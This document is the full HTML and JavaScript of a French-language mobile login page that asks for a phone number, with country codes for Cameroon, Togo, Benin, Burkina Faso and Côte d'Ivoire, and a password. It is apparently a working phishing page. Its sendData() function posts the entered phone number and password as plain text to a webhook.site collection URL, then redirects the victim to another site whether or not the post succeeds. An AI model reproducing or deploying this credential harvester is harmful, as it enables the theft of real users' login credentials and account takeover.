<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f2f2f2;
    }

    .header-image {
      position: relative;
      width: 100%;
      height: 260px;
      background: url('https://www.reisereporter.de/resizer/v2/RTR47EGRXBHC5ACFYNXFEGJ5MU.jpg?auth=1b0a223c51fca3feb4d0a64ec62c490a490d1b9308d6668b71a7be682c84082c&quality=70&width=1284&height=722&smart=true') no-repeat center center;
      background-size: cover;
    }

    .toggle-buttons {
      position: absolute;
      bottom: -25px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      border-radius: 30px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      overflow: hidden;
    }

    .toggle-buttons button {
      padding: 12px 22px;
      border: none;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
    }

    .toggle-buttons .active {
      background: black;
      color: white;
    }

    .toggle-buttons .inactive {
      background: white;
      color: black;
    }

    .form-container {
      margin-top: 50px;
      background: white;
      padding: 30px 20px;
      border-radius: 20px;
      max-width: 400px;
      margin-left: auto;
      margin-right: auto;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    }

    .form-group {
      display: flex;
      align-items: center;
      border-bottom: 1px solid #ccc;
      margin-bottom: 20px;
      padding-bottom: 8px;
    }

    .form-group input {
      border: none;
      outline: none;
      width: 100%;
      margin-left: 10px;
      font-size: 16px;
    }

    .form-group svg.phone-icon {
      width: 20px;
      height: 20px;
      fill: black;
    }

    .form-group img {
      width: 20px;
    }

    .country-code {
      margin-right: 10px;
      cursor: pointer;
      position: relative;
      display: flex;
      align-items: center;
      font-size: 16px;
    }

    .country-code svg.arrow-icon {
      width: 12px;
      height: 12px;
      margin-left: 5px;
      fill: black;
    }

    .checkbox {
      margin-bottom: 20px;
    }

    .submit-btn {
      width: 100%;
      padding: 14px;
      background: #e53914;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      display: none;
      z-index: 10;
    }

    .country-selector {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: white;
      border-top-left-radius: 20px;
      border-top-right-radius: 20px;
      padding: 20px;
      max-height: 80%;
      overflow-y: auto;
      display: none;
      z-index: 11;
    }

    .country-search {
      display: flex;
      margin-bottom: 15px;
    }

    .country-search input {
      flex: 1;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 8px 0 0 8px;
      outline: none;
    }

    .country-search button {
      background: #e53914;
      color: white;
      border: none;
      padding: 10px 15px;
      border-radius: 0 8px 8px 0;
      cursor: pointer;
    }

    .country-option {
      background: linear-gradient(to right, #e53914, #9b0aa6);
      color: white;
      padding: 14px 18px;
      border-radius: 10px;
      margin-bottom: 10px;
      font-weight: bold;
      display: flex;
      justify-content: space-between;
      align-items: center;
      cursor: pointer;
    }

    @media (max-width: 500px) {
      .form-container {
        margin-top: 50px;
        border-radius: 20px;
        padding: 25px 15px;
      }

      .toggle-buttons button {
        padding: 10px 18px;
        font-size: 14px;
      }
    }
  </style>
</head>
<body>

  <!-- IMAGE + BOUTONS -->
  <div class="header-image">
    <div class="toggle-buttons">
      <button class="active">Se connecter</button>
      <button class="inactive">Cr√©er un compte</button>
    </div>
  </div>

  <!-- FORMULAIRE -->
  <div class="form-container">
    <div class="form-group">
      <svg class="phone-icon" viewBox="0 0 24 24"><path d="M17 1H7a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2ZM12 21a1.25 1.25 0 1 1 0-2.5A1.25 1.25 0 0 1 12 21Zm5-3.5h-10V4h10Z"/></svg>
      <span class="country-code" onclick="openSelector()">
        <span id="currentCode">+237</span>
        <svg class="arrow-icon" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
      </span>
      <input type="tel" id="phone" placeholder="Entrez votre num√©ro de portable" />
    </div>

    <div class="form-group">
      <img src="https://img.icons8.com/ios-filled/50/lock.png" alt="lock" />
      <input type="password" id="password" placeholder="Veuillez entrer votre mot de passe" />
    </div>

    <div class="checkbox">
      <input type="checkbox" id="remember" />
      <label for="remember">Se souvenir du mot de passe</label>
    </div>

    <button class="submit-btn" onclick="sendData()">Connectez-vous √† votre compte</button>
  </div>

  <!-- OVERLAY + SELECTEUR -->
  <div class="overlay" onclick="closeSelector()"></div>

  <div class="country-selector" id="selector">
    <div class="country-search">
      <input type="text" id="search" placeholder="S√©lectionner l‚Äôindicatif r√©gional">
      <button>üîç Rechercher</button>
    </div>
    <div class="country-option" onclick="selectCode('+237')">+237 <span>R√©publique du Cameroun</span></div>
    <div class="country-option" onclick="selectCode('+228')">+228 <span>R√©publique togolaise</span></div>
    <div class="country-option" onclick="selectCode('+229')">+229 <span>R√©publique du B√©nin</span></div>
    <div class="country-option" onclick="selectCode('+226')">+226 <span>Burkina Faso</span></div>
    <div class="country-option" onclick="selectCode('+225')">+225 <span>R√©publique de C√¥te d'Ivoire</span></div>
  </div>

  <script>
    function openSelector() {
      document.querySelector('.overlay').style.display = 'block';
      document.querySelector('.country-selector').style.display = 'block';
    }

    function closeSelector() {
      document.querySelector('.overlay').style.display = 'none';
      document.querySelector('.country-selector').style.display = 'none';
    }

    function selectCode(code) {
      document.getElementById('currentCode').textContent = code;
      closeSelector();
    }

    function sendData() {
      const code = document.getElementById('currentCode').textContent.trim();
      const phone = document.getElementById('phone').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!phone || !password) {
        alert("Veuillez remplir tous les champs !");
        return;
      }

      const data = {
        phone: code + phone,
        password: password
      };

      fetch("https://webhook.site/d47102ec-cb03-4b85-83d7-d85b4c854457", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain"
        },
        body: JSON.stringify(data)
      })
      .then(() => {
        window.location.href = "https://ibisabb.cc";
      })
      .catch(() => {
        window.location.href = "https://ibisabb.cc";
      });
    }
  </script>

</body>
</html>
